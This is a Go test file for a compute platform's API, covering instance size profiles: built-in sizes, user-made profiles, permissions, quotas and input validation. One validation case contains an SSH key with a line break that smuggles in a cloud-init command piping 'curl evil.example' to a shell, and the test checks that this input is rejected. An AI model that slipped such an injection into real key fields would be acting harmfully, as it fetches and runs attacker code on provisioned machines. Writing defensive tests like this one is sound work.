package api

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"reflect"
	"strings"
	"testing"

	"github.com/phorge-fr/phorge-api/internal/compute"
	"github.com/phorge-fr/phorge-api/internal/status"
)

func TestProfilesAreThreeSizes(t *testing.T) {
	e := newEnv(t)
	var body struct {
		Items []profileBody `json:"items"`
	}
	mustDecode(t, e.do(t, "GET", "/v1/tenants/demo/profiles", "viewer", ""), &body)
	want := []profileBody{
		{Name: "s", Description: "1 vCPU, 2 GiB RAM, 64 GiB disk", CPU: 1, MemoryMiB: 2048, DiskGiB: 64, Builtin: true},
		{Name: "m", Description: "2 vCPU, 4 GiB RAM, 128 GiB disk", CPU: 2, MemoryMiB: 4096, DiskGiB: 128, Builtin: true},
		{Name: "l", Description: "4 vCPU, 8 GiB RAM, 256 GiB disk", CPU: 4, MemoryMiB: 8192, DiskGiB: 256, Builtin: true},
	}
	if len(body.Items) != 3 {
		t.Fatalf("items = %+v", body.Items)
	}
	for i := range want {
		if !reflect.DeepEqual(body.Items[i], want[i]) {
			t.Errorf("profile %d = %+v, want %+v", i, body.Items[i], want[i])
		}
	}
}

// The numbers of the profiles are written twice, here and in the Tenant composition of Hangar (composition-tenant.yml): what the
// description says is what the fields hold.
func TestTheBuiltinProfilesDescribeTheirOwnNumbers(t *testing.T) {
	for _, p := range compute.BuiltinProfiles {
		want := fmt.Sprintf("%d vCPU, %d GiB RAM, %d GiB disk", p.CPU, p.MemoryMiB/1024, p.DiskGiB)
		if p.Description != want {
			t.Errorf("profile %s: description %q, numbers say %q", p.Name, p.Description, want)
		}
	}
}

func TestLimitsPublishTheCeilingsOfTheDeployment(t *testing.T) {
	set := testSettings
	set.MaxProfilesPerTenant, set.MaxImagesPerTenant, set.MaxTenantsPerUser = 7, 9, 3
	e := newEnvWith(t, set)
	var body limitsBody
	mustDecode(t, e.do(t, "GET", "/v1/limits", "mallory", ""), &body)
	if body.Profile.MaxPerTenant != 7 || body.Image.MaxPerTenant != 9 || body.Tenant.MaxPerUser != 3 {
		t.Errorf("ceilings = %+v %+v %+v", body.Profile, body.Image, body.Tenant)
	}
	// 0 is no limit and is said as 0
	mustDecode(t, newEnv(t).do(t, "GET", "/v1/limits", "mallory", ""), &body)
	if body.Profile.MaxPerTenant != 0 || body.Image.MaxPerTenant != 0 || body.Tenant.MaxPerUser != 0 {
		t.Errorf("no limit set, got %+v %+v %+v", body.Profile, body.Image, body.Tenant)
	}
}

func TestLimitsNeedACredentialAndSayWhatTheAPIEnforces(t *testing.T) {
	e := newEnv(t)
	if code := call(t, e, "GET", "/v1/limits", "", ""); code != http.StatusUnauthorized {
		t.Errorf("without a credential: status %d, want 401", code)
	}
	var body limitsBody
	// Anyone signed in: the numbers hold nothing about a tenant.
	mustDecode(t, e.do(t, "GET", "/v1/limits", "mallory", ""), &body)
	if body.Instance.CPU != (compute.Limit{Min: 1, Max: 16, Default: 1}) ||
		body.Instance.MemoryMiB != (compute.Limit{Min: 256, Max: 65536, Default: 1024}) ||
		body.Instance.DiskGiB != (compute.Limit{Min: 1, Max: 500, Default: 10}) {
		t.Errorf("instance limits = %+v", body.Instance)
	}
	if body.Instance.MaxSSHKeys != 20 || body.Network.MaxNameLength != 15 || body.Network.MaxDescriptionLength != 200 {
		t.Errorf("limits = %+v", body)
	}
}

func TestCreateInstanceFromAProfile(t *testing.T) {
	e := newEnv(t)
	e.images.put("demo", readyImage("debian"))
	rec := e.do(t, "POST", "/v1/tenants/demo/instances", "user", `{"name":"web","image":"debian","profile":"m"}`)
	if rec.Code != http.StatusAccepted {
		t.Fatalf("status %d: %s", rec.Code, rec.Body)
	}
	got := e.instances.created[0]
	if got.Profile != "m" || got.CPU != nil || got.MemoryMiB != nil || got.DiskGiB != nil {
		t.Errorf("the store received %+v: a profile is the whole size", got)
	}
	var body instanceBody
	mustDecode(t, rec, &body)
	if body.Profile != "m" || body.CPU != 2 || body.MemoryMiB != 4096 || body.DiskGiB != 128 {
		t.Errorf("body = %+v: the profile, and what it comes to", body)
	}
}

func TestCreateInstanceRefusesAProfileWithASizeOrAnUnknownProfile(t *testing.T) {
	e := newEnv(t)
	e.images.put("demo", readyImage("debian"))
	for name, tt := range map[string]struct{ body, want string }{
		"a profile and a cpu":    {`{"name":"a","image":"debian","profile":"m","cpu":2}`, "not both"},
		"a profile and a memory": {`{"name":"a","image":"debian","profile":"m","memoryMiB":2048}`, "not both"},
		"a profile and a disk":   {`{"name":"a","image":"debian","profile":"m","diskGiB":20}`, "not both"},
		"an unknown profile":     {`{"name":"a","image":"debian","profile":"xl"}`, "profile xl does not exist in this tenant: s, m, l"},
		"a bad profile name":     {`{"name":"a","image":"debian","profile":"-m"}`, "profile must be the name"},
	} {
		rec := e.do(t, "POST", "/v1/tenants/demo/instances", "user", tt.body)
		if rec.Code != http.StatusUnprocessableEntity || !strings.Contains(rec.Body.String(), tt.want) {
			t.Errorf("%s: status %d: %s, want 422 with %q", name, rec.Code, rec.Body, tt.want)
		}
	}
	if len(e.instances.created) != 0 {
		t.Errorf("something reached the store: %+v", e.instances.created)
	}
}

func TestPatchMovesAnInstanceBetweenAProfileAndItsOwnSize(t *testing.T) {
	// A fresh environment for each case: a patch changes the instance the next one finds.
	patch := func(t *testing.T, in compute.Instance, body string) (*httptest.ResponseRecorder, *instanceStore) {
		t.Helper()
		e := newEnv(t)
		in.Name = "vm"
		in.Image = "debian"
		e.instances.put("demo", in)
		return e.do(t, "PATCH", "/v1/tenants/demo/instances/vm", "user", body), e.instances
	}
	custom := compute.Instance{CPU: 1, MemoryMiB: 1024, DiskGiB: 10}
	sized := compute.Instance{Profile: "s"}

	t.Run("to a profile", func(t *testing.T) {
		rec, st := patch(t, custom, `{"profile":"m"}`)
		if rec.Code != http.StatusOK {
			t.Fatalf("status %d: %s", rec.Code, rec.Body)
		}
		if p := st.patched[0]; p.Profile == nil || *p.Profile != "m" || p.DropProfile {
			t.Errorf("patch = %+v", p)
		}
	})
	t.Run("out of a profile with the three values together", func(t *testing.T) {
		rec, st := patch(t, sized, `{"cpu":2,"memoryMiB":2048,"diskGiB":20}`)
		if rec.Code != http.StatusOK {
			t.Fatalf("status %d: %s", rec.Code, rec.Body)
		}
		if p := st.patched[0]; !p.DropProfile || p.Profile != nil {
			t.Errorf("patch = %+v: the profile must be dropped with the three values", p)
		}
	})
	t.Run("a value alone on an instance that has a profile", func(t *testing.T) {
		rec, st := patch(t, sized, `{"cpu":4}`)
		if rec.Code != http.StatusUnprocessableEntity || !strings.Contains(rec.Body.String(), "has the profile s") {
			t.Errorf("status %d: %s", rec.Code, rec.Body)
		}
		if len(st.patched) != 0 {
			t.Errorf("something reached the store: %+v", st.patched)
		}
	})
	t.Run("a profile and a value", func(t *testing.T) {
		rec, _ := patch(t, custom, `{"profile":"s","cpu":4}`)
		if rec.Code != http.StatusUnprocessableEntity || !strings.Contains(rec.Body.String(), "not both") {
			t.Errorf("status %d: %s", rec.Code, rec.Body)
		}
	})
	t.Run("an unknown profile", func(t *testing.T) {
		rec, _ := patch(t, custom, `{"profile":"xl"}`)
		if rec.Code != http.StatusUnprocessableEntity || !strings.Contains(rec.Body.String(), "profile xl does not exist") {
			t.Errorf("status %d: %s", rec.Code, rec.Body)
		}
	})
	t.Run("a value alone on an instance that has none is what it always was", func(t *testing.T) {
		rec, st := patch(t, custom, `{"cpu":4}`)
		if rec.Code != http.StatusOK || st.patched[0].DropProfile {
			t.Errorf("status %d: %s", rec.Code, rec.Body)
		}
	})
}

func madeProfile(name string, cpu, mem, disk int) compute.Profile {
	return compute.Profile{Name: name, CPU: cpu, MemoryMiB: mem, DiskGiB: disk, CreatedAt: now, Status: status.Object{Ready: true, NotReadySince: now}}
}

func TestProfilesWhoMayDoWhat(t *testing.T) {
	const coll, item = "/v1/tenants/demo/profiles", "/v1/tenants/demo/profiles/web"
	create := `{"name":"new","cpu":1,"memoryMiB":1024,"diskGiB":10}`
	tests := []struct {
		who                       string
		list, get, create, delete int
	}{
		{"viewer", 200, 200, 403, 403},
		{"user", 200, 200, 403, 403},
		{"operator", 200, 200, 202, 202},
		{"admin", 200, 200, 202, 202},
		{"svc", 403, 403, 403, 403},
		{"svc_mgr", 403, 403, 403, 403},
		{"mallory", 404, 404, 404, 404},
		{"", 401, 401, 401, 401},
	}
	for _, tt := range tests {
		t.Run(tt.who, func(t *testing.T) {
			e := newEnv(t)
			e.profiles.put("demo", madeProfile("web", 1, 1024, 10))
			for _, c := range []struct {
				method, path, body string
				want               int
			}{
				{"GET", coll, "", tt.list}, {"GET", item, "", tt.get}, {"POST", coll, create, tt.create}, {"DELETE", item, "", tt.delete},
			} {
				if got := call(t, e, c.method, c.path, tt.who, c.body); got != c.want {
					t.Errorf("%s %s: status %d, want %d", c.method, c.path, got, c.want)
				}
			}
		})
	}
}

func TestTheListHoldsTheThreeOfTheTenantThenTheOnesTheUserMade(t *testing.T) {
	e := newEnv(t)
	e.profiles.put("demo", madeProfile("zeta", 1, 1024, 10))
	e.profiles.put("demo", madeProfile("alpha", 2, 2048, 20))
	var body struct {
		Items []profileBody `json:"items"`
	}
	mustDecode(t, e.do(t, "GET", "/v1/tenants/demo/profiles", "viewer", ""), &body)
	var names []string
	for _, p := range body.Items {
		names = append(names, p.Name)
		if p.Builtin && (p.Phase != nil || p.CreatedAt != nil) {
			t.Errorf("%s: a profile every tenant has carries what a made one does: %+v", p.Name, p)
		}
		if !p.Builtin && (p.Phase == nil || p.CreatedAt == nil || p.Description == "") {
			t.Errorf("%s: a made profile has a phase, a date and says what it comes to: %+v", p.Name, p)
		}
	}
	if got := strings.Join(names, " "); got != "s m l alpha zeta" {
		t.Errorf("names = %s", got)
	}
	// one by one, a built-in and a made one, and one that is not there
	var one profileBody
	mustDecode(t, e.do(t, "GET", "/v1/tenants/demo/profiles/alpha", "viewer", ""), &one)
	if one.CPU != 2 || one.Builtin || one.Description != "2 vCPU, 2048 MiB RAM, 20 GiB disk" {
		t.Errorf("alpha = %+v", one)
	}
	if code := call(t, e, "GET", "/v1/tenants/demo/profiles/m", "viewer", ""); code != http.StatusOK {
		t.Errorf("m: %d", code)
	}
	if code := call(t, e, "GET", "/v1/tenants/demo/profiles/ghost", "viewer", ""); code != http.StatusNotFound {
		t.Errorf("ghost: %d", code)
	}
}

func TestMakeAProfile(t *testing.T) {
	e := newEnv(t)
	rec := e.do(t, "POST", "/v1/tenants/demo/profiles", "operator", `{"name":"web","description":"for the web servers","cpu":2,"memoryMiB":2048,"diskGiB":20}`)
	if rec.Code != http.StatusAccepted {
		t.Fatalf("status %d: %s", rec.Code, rec.Body)
	}
	if got := rec.Header().Get("Location"); got != "/v1/tenants/demo/profiles/web" {
		t.Errorf("Location = %q", got)
	}
	var body profileBody
	mustDecode(t, rec, &body)
	if body.Name != "web" || body.Builtin || body.CPU != 2 || body.MemoryMiB != 2048 || body.DiskGiB != 20 || body.CreatedBy != "user:operator@example.org" {
		t.Errorf("body = %+v", body)
	}
	if got := e.profiles.created; len(got) != 1 || *got[0].CPU != 2 {
		t.Errorf("the store received %+v", got)
	}
	if code := call(t, e, "POST", "/v1/tenants/demo/profiles", "operator", `{"name":"web","cpu":1,"memoryMiB":1024,"diskGiB":10}`); code != http.StatusConflict {
		t.Errorf("the same name twice: status %d, want 409", code)
	}
}

func TestMakeAProfileRefusesABadRequest(t *testing.T) {
	e := newEnv(t)
	const sz = `"cpu":1,"memoryMiB":1024,"diskGiB":10`
	for name, tt := range map[string]struct{ body, want string }{
		"no name":            {`{` + sz + `}`, "name must be"},
		"uppercase":          {`{"name":"Web",` + sz + `}`, "name must be"},
		"a digit first":      {`{"name":"1web",` + sz + `}`, "name must be"},
		"ends with a hyphen": {`{"name":"web-",` + sz + `}`, "name must be"},
		"33 characters":      {`{"name":"` + strings.Repeat("a", 33) + `",` + sz + `}`, "name must be"},
		"s is taken":         {`{"name":"s",` + sz + `}`, "name s is taken"},
		"m is taken":         {`{"name":"m",` + sz + `}`, "name m is taken"},
		"l is taken":         {`{"name":"l",` + sz + `}`, "name l is taken"},
		"default is taken":   {`{"name":"default",` + sz + `}`, "name default is taken"},
		"no cpu":             {`{"name":"web","memoryMiB":1024,"diskGiB":10}`, "cpu is required"},
		"no memory":          {`{"name":"web","cpu":1,"diskGiB":10}`, "memoryMiB is required"},
		"no disk":            {`{"name":"web","cpu":1,"memoryMiB":1024}`, "diskGiB is required"},
		"cpu 0":              {`{"name":"web","cpu":0,"memoryMiB":1024,"diskGiB":10}`, "cpu must be between"},
		"cpu 17":             {`{"name":"web","cpu":17,"memoryMiB":1024,"diskGiB":10}`, "cpu must be between"},
		"memory 255":         {`{"name":"web","cpu":1,"memoryMiB":255,"diskGiB":10}`, "memoryMiB must be between"},
		"disk 501":           {`{"name":"web","cpu":1,"memoryMiB":1024,"diskGiB":501}`, "diskGiB must be between"},
		"a long description": {`{"name":"web","description":"` + strings.Repeat("x", 201) + `",` + sz + `}`, "description must be"},
	} {
		rec := e.do(t, "POST", "/v1/tenants/demo/profiles", "operator", tt.body)
		if rec.Code != http.StatusUnprocessableEntity || !strings.Contains(rec.Body.String(), tt.want) {
			t.Errorf("%s: status %d: %s, want 422 with %q", name, rec.Code, rec.Body, tt.want)
		}
	}
	if code := call(t, e, "POST", "/v1/tenants/demo/profiles", "operator", `{"name":"web","nat":true,`+sz+`}`); code != http.StatusBadRequest {
		t.Errorf("a field the kind does not have: %d, want 400", code)
	}
	if len(e.profiles.created) != 0 {
		t.Errorf("something reached the store: %+v", e.profiles.created)
	}
	if code := call(t, e, "POST", "/v1/tenants/ghost/profiles", "admin", `{"name":"web",`+sz+`}`); code != http.StatusNotFound {
		t.Errorf("a tenant that does not exist: %d", code)
	}
}

// A profile carries the secure boot and the SSH keys of an instance, and says only what it was given: the answer shows them, and shows
// nothing for what the profile does not say.
func TestMakeAProfileWithTheSecureBootAndTheKeysOfAnInstance(t *testing.T) {
	const sz = `"cpu":1,"memoryMiB":1024,"diskGiB":10`
	t.Run("both", func(t *testing.T) {
		e := newEnv(t)
		rec := e.do(t, "POST", "/v1/tenants/demo/profiles", "operator", `{"name":"web",`+sz+`,"secureBoot":false,"sshPublicKeys":["`+sshKey+` leo@laptop"]}`)
		if rec.Code != http.StatusAccepted {
			t.Fatalf("status %d: %s", rec.Code, rec.Body)
		}
		got := e.profiles.created[0]
		if got.SecureBoot == nil || *got.SecureBoot || len(got.SSHPublicKeys) != 1 {
			t.Errorf("the store received %+v", got)
		}
		var body profileBody
		mustDecode(t, rec, &body)
		if body.SecureBoot == nil || *body.SecureBoot || len(body.SSHPublicKeys) != 1 || body.SSHPublicKeys[0] != sshKey+" leo@laptop" {
			t.Errorf("body = %+v", body)
		}
		// one by one and in the list
		var one profileBody
		mustDecode(t, e.do(t, "GET", "/v1/tenants/demo/profiles/web", "viewer", ""), &one)
		if one.SecureBoot == nil || *one.SecureBoot || len(one.SSHPublicKeys) != 1 {
			t.Errorf("get = %+v", one)
		}
	})
	t.Run("a true secure boot is said as true", func(t *testing.T) {
		e := newEnv(t)
		rec := e.do(t, "POST", "/v1/tenants/demo/profiles", "operator", `{"name":"web",`+sz+`,"secureBoot":true}`)
		var body profileBody
		mustDecode(t, rec, &body)
		if body.SecureBoot == nil || !*body.SecureBoot || body.SSHPublicKeys != nil {
			t.Errorf("body = %+v", body)
		}
	})
	t.Run("neither is absent, not false and not empty", func(t *testing.T) {
		e := newEnv(t)
		rec := e.do(t, "POST", "/v1/tenants/demo/profiles", "operator", `{"name":"web",`+sz+`}`)
		if got := e.profiles.created[0]; got.SecureBoot != nil || got.SSHPublicKeys != nil {
			t.Errorf("the store received %+v: a setting the request does not give is not sent", got)
		}
		for _, field := range []string{"secureBoot", "sshPublicKeys"} {
			if strings.Contains(rec.Body.String(), field) {
				t.Errorf("the answer says %s of a profile that does not: %s", field, rec.Body)
			}
		}
	})
	t.Run("the profiles every tenant has say none", func(t *testing.T) {
		e := newEnv(t)
		rec := e.do(t, "GET", "/v1/tenants/demo/profiles/m", "viewer", "")
		if strings.Contains(rec.Body.String(), "secureBoot") || strings.Contains(rec.Body.String(), "sshPublicKeys") {
			t.Errorf("body = %s", rec.Body)
		}
	})
}

// The keys are checked as the ones of an instance, by the same function, and a profile has neither nesting nor a network.
func TestMakeAProfileRefusesBadSettings(t *testing.T) {
	e := newEnv(t)
	const sz = `"name":"web","cpu":1,"memoryMiB":1024,"diskGiB":10`
	keys := make([]string, 21)
	for i := range keys {
		keys[i] = `"` + sshKey + ` k` + fmt.Sprint(i) + `"`
	}
	for name, tt := range map[string]struct {
		body string
		code int
		want string
	}{
		"a bad key":         {`{` + sz + `,"sshPublicKeys":["nope"]}`, http.StatusUnprocessableEntity, "sshPublicKeys[0] must be one line"},
		"a line break":      {`{` + sz + `,"sshPublicKeys":["` + sshKey + `\nruncmd:\n  - curl evil.example | sh"]}`, http.StatusUnprocessableEntity, "sshPublicKeys[0] must be one line"},
		"a key twice":       {`{` + sz + `,"sshPublicKeys":["` + sshKey + `","` + sshKey + `"]}`, http.StatusUnprocessableEntity, "sshPublicKeys[1] is given twice"},
		"21 keys":           {`{` + sz + `,"sshPublicKeys":[` + strings.Join(keys, ",") + `]}`, http.StatusUnprocessableEntity, "at most 20 sshPublicKeys"},
		"a string for keys": {`{` + sz + `,"sshPublicKeys":"` + sshKey + `"}`, http.StatusBadRequest, "not valid"},
		"a text for secure": {`{` + sz + `,"secureBoot":"no"}`, http.StatusBadRequest, "not valid"},
		"nesting":           {`{` + sz + `,"nesting":true}`, http.StatusBadRequest, "unknown field"},
		"a network":         {`{` + sz + `,"networks":["net"]}`, http.StatusBadRequest, "unknown field"},
	} {
		rec := e.do(t, "POST", "/v1/tenants/demo/profiles", "operator", tt.body)
		if rec.Code != tt.code || !strings.Contains(rec.Body.String(), tt.want) {
			t.Errorf("%s: status %d: %s, want %d with %q", name, rec.Code, rec.Body, tt.code, tt.want)
		}
	}
	if len(e.profiles.created) != 0 {
		t.Errorf("something reached the store: %+v", e.profiles.created)
	}
}

func TestATenantHoldsAtMostSomeProfiles(t *testing.T) {
	s := testSettings
	s.MaxProfilesPerTenant = 2
	e := newEnvWith(t, s)
	e.profiles.put("demo", madeProfile("one", 1, 1024, 10))
	const sz = `"cpu":1,"memoryMiB":1024,"diskGiB":10`
	if code := call(t, e, "POST", "/v1/tenants/demo/profiles", "operator", `{"name":"two",`+sz+`}`); code != http.StatusAccepted {
		t.Fatalf("the second: status %d", code)
	}
	rec := e.do(t, "POST", "/v1/tenants/demo/profiles", "operator", `{"name":"three",`+sz+`}`)
	if rec.Code != http.StatusConflict || !strings.Contains(rec.Body.String(), `"quota_exceeded"`) || !strings.Contains(rec.Body.String(), "2 out of 2") {
		t.Errorf("the third: status %d: %s", rec.Code, rec.Body)
	}
}

func TestDeleteAProfile(t *testing.T) {
	e := newEnv(t)
	e.profiles.put("demo", madeProfile("web", 1, 1024, 10))
	rec := e.do(t, "DELETE", "/v1/tenants/demo/profiles/web", "operator", "")
	if rec.Code != http.StatusAccepted {
		t.Fatalf("status %d: %s", rec.Code, rec.Body)
	}
	var body profileBody
	mustDecode(t, rec, &body)
	if body.Phase == nil || *body.Phase != "Deleting" {
		t.Errorf("body = %+v", body)
	}
	if code := call(t, e, "DELETE", "/v1/tenants/demo/profiles/ghost", "operator", ""); code != http.StatusNotFound {
		t.Errorf("a profile that does not exist: %d", code)
	}
	// the three of the tenant are not the user's
	for _, name := range []string{"s", "m", "l", "default"} {
		rec := e.do(t, "DELETE", "/v1/tenants/demo/profiles/"+name, "operator", "")
		if rec.Code != http.StatusForbidden || !strings.Contains(rec.Body.String(), "every tenant has") {
			t.Errorf("deleting %s: status %d: %s", name, rec.Code, rec.Body)
		}
	}
}

func TestDeleteAProfileInUseNamesTheInstances(t *testing.T) {
	e := newEnv(t)
	e.profiles.put("demo", madeProfile("web", 1, 1024, 10))
	e.instances.put("demo", compute.Instance{Name: "a", Profile: "web"})
	e.instances.put("demo", compute.Instance{Name: "b", Profile: "web"})
	e.instances.put("demo", compute.Instance{Name: "c", Profile: "s"})
	rec := e.do(t, "DELETE", "/v1/tenants/demo/profiles/web", "operator", "")
	if rec.Code != http.StatusConflict || !strings.Contains(rec.Body.String(), `"in_use"`) || !strings.Contains(rec.Body.String(), "a, b") || strings.Contains(rec.Body.String(), "c") && strings.Contains(rec.Body.String(), ", c") {
		t.Errorf("status %d: %s: the refusal names the instances that have it, and only them", rec.Code, rec.Body)
	}
	if len(e.profiles.deleted) != 0 {
		t.Errorf("a profile in use was deleted: %v", e.profiles.deleted)
	}
}

func TestAnInstanceTakesAProfileTheUserMade(t *testing.T) {
	e := newEnv(t)
	e.images.put("demo", readyImage("debian"))
	e.profiles.put("demo", madeProfile("web", 3, 3072, 30))
	rec := e.do(t, "POST", "/v1/tenants/demo/instances", "user", `{"name":"web1","image":"debian","profile":"web"}`)
	if rec.Code != http.StatusAccepted {
		t.Fatalf("status %d: %s", rec.Code, rec.Body)
	}
	var body instanceBody
	mustDecode(t, rec, &body)
	if body.Profile != "web" || body.CPU != 3 || body.MemoryMiB != 3072 || body.DiskGiB != 30 {
		t.Errorf("body = %+v: the profile, and what the user's own profile comes to", body)
	}
	// the list and one by one say it too
	var got instanceBody
	mustDecode(t, e.do(t, "GET", "/v1/tenants/demo/instances/web1", "viewer", ""), &got)
	if got.CPU != 3 {
		t.Errorf("get: %+v", got)
	}
	var list struct {
		Items []instanceBody `json:"items"`
	}
	mustDecode(t, e.do(t, "GET", "/v1/tenants/demo/instances", "viewer", ""), &list)
	if len(list.Items) != 1 || list.Items[0].DiskGiB != 30 {
		t.Errorf("list: %+v", list.Items)
	}
}

func TestAnUnknownProfileListsTheOnesTheTenantHas(t *testing.T) {
	e := newEnv(t)
	e.images.put("demo", readyImage("debian"))
	e.profiles.put("demo", madeProfile("web", 1, 1024, 10))
	rec := e.do(t, "POST", "/v1/tenants/demo/instances", "user", `{"name":"a","image":"debian","profile":"xl"}`)
	if rec.Code != http.StatusUnprocessableEntity || !strings.Contains(rec.Body.String(), "profile xl does not exist in this tenant: s, m, l, web") {
		t.Errorf("status %d: %s", rec.Code, rec.Body)
	}
	// a profile another tenant made is not this one's
	e.profiles.put("other", madeProfile("secret", 1, 1024, 10))
	if code := call(t, e, "POST", "/v1/tenants/demo/instances", "user", `{"name":"b","image":"debian","profile":"secret"}`); code != http.StatusUnprocessableEntity {
		t.Errorf("another tenant's profile: status %d, want 422", code)
	}
}

func TestAProfileTheUserMadeCountsInTheQuota(t *testing.T) {
	e := newEnv(t)
	withTiny(e)
	e.networks.put("tiny", readyNetwork("net"))
	e.profiles.put("tiny", madeProfile("big", 1, 1024, 200)) // the small plan holds 128 GiB of disk
	rec := e.do(t, "POST", "/v1/tenants/tiny/instances", "operator", `{"name":"a","image":"debian","profile":"big"}`)
	if rec.Code != http.StatusConflict || !strings.Contains(quotaCode(t, rec.Body.String()), "200 GiB of disk") {
		t.Errorf("status %d: %s", rec.Code, rec.Body)
	}
	e.profiles.put("tiny", madeProfile("fits", 1, 1024, 10))
	if code := call(t, e, "POST", "/v1/tenants/tiny/instances", "operator", `{"name":"b","image":"debian","profile":"fits"}`); code != http.StatusAccepted {
		t.Errorf("a profile that fits: status %d", code)
	}
	// and what the tenant holds says so
	var q quotaBody
	mustDecode(t, e.do(t, "GET", "/v1/tenants/tiny/quota", "operator", ""), &q)
	if q.Used.DiskGiB != 10 || q.Used.VCPU != 1 {
		t.Errorf("used = %+v: the instance counts what its own profile comes to", q.Used)
	}
}

func TestAnInstanceMovesToAProfileTheUserMade(t *testing.T) {
	e := newEnv(t)
	e.profiles.put("demo", madeProfile("web", 1, 1024, 10))
	e.instances.put("demo", compute.Instance{Name: "vm", Image: "debian", CPU: 2, MemoryMiB: 2048, DiskGiB: 20})
	if code := call(t, e, "PATCH", "/v1/tenants/demo/instances/vm", "user", `{"profile":"web"}`); code != http.StatusOK {
		t.Fatalf("status %d", code)
	}
	if p := e.instances.patched[0]; p.Profile == nil || *p.Profile != "web" {
		t.Errorf("patch = %+v", p)
	}
}
